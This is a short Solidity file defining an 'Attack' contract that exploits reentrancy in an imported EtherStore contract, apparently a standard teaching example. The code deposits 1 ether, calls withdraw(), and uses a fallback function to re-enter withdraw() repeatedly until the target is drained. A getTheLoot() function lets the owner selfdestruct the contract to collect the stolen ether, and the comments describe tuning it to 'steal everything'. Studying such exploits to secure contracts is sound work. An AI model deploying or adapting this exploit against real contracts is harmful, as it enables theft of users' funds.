//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "./EtherStore.sol";

contract Attack{
EtherStore target;
address owner;

constructor(address a) payable {
    target = EtherStore(a);
    owner = msg.sender;
}

function attack() public {
    //here the contract deposits 1 ether to set the balance>0
    //then it calls the withdraw function
    //when withdraw executes it triggers fallback inside the attack contract
    target.deposit{value: 1 ether}();
    target.withdraw();
}

fallback() external payable{

    //when triggered fallback calls the withdraw() again
    //this leads to a recursive series of calls that dont end until the balance of 
    //the target is less than 1 ether
    //(can be optimized to steal everything with a min check)
    if(address(target).balance>1 ether)
    {
        target.withdraw();
    }
}

modifier onlyGXT{
    require(msg.sender == owner);
    _;
    
}

function getTheLoot() external onlyGXT{
    selfdestruct(payable(msg.sender));
}
}
